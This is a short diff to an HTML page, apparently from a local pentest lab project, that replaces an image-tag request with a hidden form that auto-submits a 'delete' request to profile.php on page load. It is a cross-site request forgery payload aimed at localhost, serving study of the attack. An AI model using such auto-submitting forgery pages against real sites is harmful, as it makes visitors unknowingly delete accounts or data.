@@ -9,7 +9,13 @@
 	<body>
 		<div class="login">
 			<h1>Vulnerable site</h1>
-			<img src="http://localhost/SecookiePentest/profile.php?delete=1" alt="...">
+			<!-- <img src="http://localhost/SecookiePentest/profile.php?delete=1" alt="..."> -->
+			<form id="csrf" method="POST" action="http://localhost/SecookiePentest/profile.php">
+				<input name="delete" type="submit" value="Delete now!">
+			<form>
+			<script>
+				document.getElementById('csrf').submit();
+			</script>
 		</div>
 	</body>
 </html>
